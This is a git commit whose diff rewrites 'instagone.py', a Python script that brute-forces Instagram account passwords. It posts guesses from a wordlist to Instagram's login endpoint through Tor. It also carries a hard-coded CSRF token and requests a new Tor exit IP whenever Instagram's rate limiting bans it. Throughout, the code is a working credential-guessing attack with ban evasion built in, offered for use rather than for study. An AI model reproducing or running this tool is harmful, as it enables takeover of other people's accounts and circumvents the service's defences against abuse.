3d8f92941180a07b77882e9425493ebaa26eb8b1
Kristof Hracza <57770911+IVBecy@users.noreply.github.com>
2020-09-22 23:06:02 +0100

    changed  selenium to requests

--- instagone.py
+++ instagone.py
@@ -1,13 +1,7 @@
-from selenium import webdriver
-from selenium.webdriver.common.keys import Keys
-from bs4 import BeautifulSoup
+import requests, time, threading, sys, json
 from stem import Signal
 from stem.control import Controller
 from optparse import OptionParser
-import random
-import time
-import sys
-import threading
 
 banner = """
  _____              _                                     
@@ -21,6 +15,8 @@ banner = """
 \n"""
 
 ############### USAGE
+
+
 def usage():
     print("""\n
 
@@ -40,42 +36,10 @@ def usage():
     """)
     sys.exit()
 
-############### Variables
-LOGIN_URL = "https://www.instagram.com/accounts/login/"
-PROXY = "socks5://127.0.0.1:9050"
 
-#bad titles
-badtitles = [
-  "Login • Instagram",  
-  "Page Not Found &bull; Instagram",
-  "Page Not Found • Instagram",
-]
-#messages that sign that the IP is banned
-bannedIPStrs = [
-  "Please wait a few minutes before you try again",
-  "We couldn't connect",
-  "There was a problem logging you into Instagram",
-  "Page not found"
-]
-#messages that sign that we are in
-LoggedInMsgs = [
-  'class="no-js logged-in',
-  "Suspicious Login Attempt"
-]
-#message(s) that sign that we are OUT
-LoggedOutMsgs = [
-  "incorrect"
-]
-
-# Class for all the methods we need
 class Engine():
   def __init__(self):
-    ##################### Webdriver setup ########################
-    options = webdriver.ChromeOptions()
-    options.add_argument(f"--proxy-server={PROXY}")
-    options.add_experimental_option('excludeSwitches', ['enable-logging'])
-    options.add_argument("headless")
-    self.driver = webdriver.Chrome(options=options)
+    print(f"\nStart time of script is: {time.ctime()}\n")
     ############# Setting up the options for the terminal ##################
     parser = OptionParser()
     parser.set_conflict_handler("resolve")
@@ -90,126 +54,111 @@ class Engine():
     if (options.uname is None) or (options.passlist is None) or (options.help):
       usage()
     ############# variables to be used throughout the code ##################
-    self.fetchTime = 4
-    self.uname = options.uname
-    self.passlist = options.passlist
+    self.fetchTime = 60
     self.line = 0
     self.hopCount = 0
     self.lineMultiplier = 30
+    self.KeyError = False
+    self.uname = options.uname
+    self.passlist = options.passlist
     self.passwordArray = []
-    self.ban = False
+    self.LOGIN_URL = "https://www.instagram.com/accounts/login/ajax/"
+    self.HOME_URL = "https://www.instagram.com/"
+    self.proxies = {
+        "https": "socks5://127.0.0.1:9050",
+        "http": "socks5://127.0.0.1:9050"
+    }
+    with open("headers.json",) as h:
+      self.headers = json.load(h)
     ############# putting all the passwords into an array #########################
     passwordFile = open(self.passlist, "r")
     for line in passwordFile:
       self.passwordArray.append(line.strip())
-    
-  ################################### METHODS ############################################
 
-  # New TOR IP + new browser
+  ########################### METHODS ########################################
+  # New TOR IP 
   def renew_tor_ip(self):
+    time.sleep(10)
     with Controller.from_port(port=9051) as controller:
-      time.sleep(self.fetchTime - 2)
       controller.authenticate()
       controller.signal(Signal.NEWNYM)
-      print("[!] New IP is assigned")
-      print("-"*(self.lineMultiplier - 10))
-      self.driver.quit()
-      options = webdriver.ChromeOptions()
-      options.add_argument(f"--proxy-server={PROXY}")
-      options.add_experimental_option('excludeSwitches', ['enable-logging'])
-      options.add_argument("headless")
-      self.driver = webdriver.Chrome(options=options)
-      print("[!] New browser is opened")
-      print("-"*(self.lineMultiplier - 10))
-      print("-"*self.lineMultiplier + "\n")
-      return self.driver
-  
-  # Deal with the file and new password + increment counters
+      print("[!] New IP is issued")
+      print("-"*self.lineMultiplier+"\n")
+
+  # Deal with a new password
   def passHandling(self):
     self.hopCount += 1
     self.p = self.passwordArray[self.line]
     print("-"*self.lineMultiplier)
     print(f"Username: {self.uname}")
     print(f"Password: {self.p}")
-    print(f"Number of tries: {self.hopCount}")
+    print(f"Passwords Number: {self.line}")
     print("-"*self.lineMultiplier)
     self.line += 1
     return self.p
-    
-  # logging into insta 
-  def loginProcedure(self):
-    self.driver.get(LOGIN_URL)
-    while self.driver.current_url != LOGIN_URL:
-      self.driver.get(LOGIN_URL)
-    time.sleep(self.fetchTime)
-    #banned ip
-    for string in bannedIPStrs:
-      while string in self.driver.page_source:
-        if self.ban is False:
-          self.line -= 1
-        print("[!] IP banned by Instagram")
-        print("-"*(self.lineMultiplier - 10))
-        self.renew_tor_ip()
-        self.driver.get(LOGIN_URL)
-        self.ban = True
-        return self.driver.page_source
-    self.ban = True
-    username_field = self.driver.find_element_by_name("username")
-    password_field = self.driver.find_element_by_name("password")
-    username_field.send_keys(self.uname)
-    # If the password is less than 6 chars, add and extra "111111" to the end
-    # as the HTMl button would not be clickable
-    if len(self.p) < 6:
-      self.p + "111111"
-      password_field.send_keys(self.p)
-    else:
-      password_field.send_keys(self.p)
-    submit = self.driver.find_element_by_class_name("sqdOP.L3NKy.y3zKF")
-    submit.click()
-    time.sleep(self.fetchTime + 1)
-    return self.driver.page_source
 
-  # Login detection
+  def loginProcedure(self):
+    # Headers, Cookies, and setting the csrftoken
+    session = requests.Session()
+    session.headers.update(self.headers)
+    session.cookies.update({'sessionid': '', 'mid': '', 'ig_pr': '1','ig_vw': '1920', 'csrftoken': '',  's_network': '', 'ds_user_id': ''})
+    # sea surf token
+    #token = session.get(self.HOME_URL,timeout=self.fetchTime).cookies.get_dict()['csrftoken']
+    session.headers.update({'X-CSRFToken': "zBmBPInIrzuVsDYEEWocPLRkHvwKVQyd"})
+    # login
+    str_time = str(int(time.time()))
+    PASSWORD = '#PWD_INSTAGRAM_BROWSER:0:' + str_time + ':' + self.p
+    login_data = {"username": self.uname, "enc_password": PASSWORD}
+    self.loginInfo = session.post(self.LOGIN_URL, data=login_data, proxies=self.proxies, allow_redirects=True, timeout=self.fetchTime)
+    return self.loginInfo
+
   def getError(self):
-    soup = BeautifulSoup(self.driver.page_source, "html.parser")
-    #banned ip
-    for string in bannedIPStrs:
-      if string in self.driver.page_source:
-        self.line -= 1
+    #responses from IG
+    self.response = json.loads(self.loginInfo.text)
+    #banned IP
+    if "message" in self.response:
+      if self.response["message"] == "Please wait a few minutes before you try again.":
         print("[!] IP banned by Instagram")
         print("-"*(self.lineMultiplier - 10))
         self.renew_tor_ip()
+        self.line -= 1
         return None
-    #other login possibilities
-    for msgs in LoggedInMsgs:
-      if msgs in soup:
-        print("\n[+] Password found")
-        print(f"Password: {self.p}")
-        print(f"Username: {self.uname}\n")
-        self.driver.quit()
+      #check point
+      if self.response["message"] == "checkpoint_required":
+        print(f"""\n
+  [+] Password FOUND!
+
+  Password: {self.p}
+
+  Username: {self.uname}      
+
+Script ended at: {time.ctime()}
+  
+  \n""")
         sys.exit()
-    # title
-    if soup.title.string in badtitles:
-      print("[-] No match")    
-      print("-"*self.lineMultiplier + "\n")
-     # title
-    elif "incorrect" in badtitles:
-      print("[-] No match")
-      print("-"*self.lineMultiplier + "\n")
-    # good title
-    else:
-      print("\n[+] Password found")
-      print(f"Password: {self.p}")
-      print(f"Username: {self.uname}\n")
-      self.driver.quit()
-      sys.exit()
+    #bad pass
+    if  "authenticated" in self.response:
+      # no pass match
+      if self.response["authenticated"] is False:
+        print("[-] No match")
+      # pass match
+      elif self.response["authenticated"] is True:
+        print(f"""\n
+  [+] Password FOUND!
+
+  Password: {self.p}
+
+  Username: {self.uname}   
+
+Script ended at: {time.ctime()}   
+  
+  \n""")
+        sys.exit()
+    print("-"*self.lineMultiplier+"\n")
 
 print(banner)
-# calling the class outside of the loop, so it will not rewrite all the vars
 BRUTER = Engine()
-#Looping
 while True:
   BRUTER.passHandling()
   BRUTER.loginProcedure()
   BRUTER.getError()
-
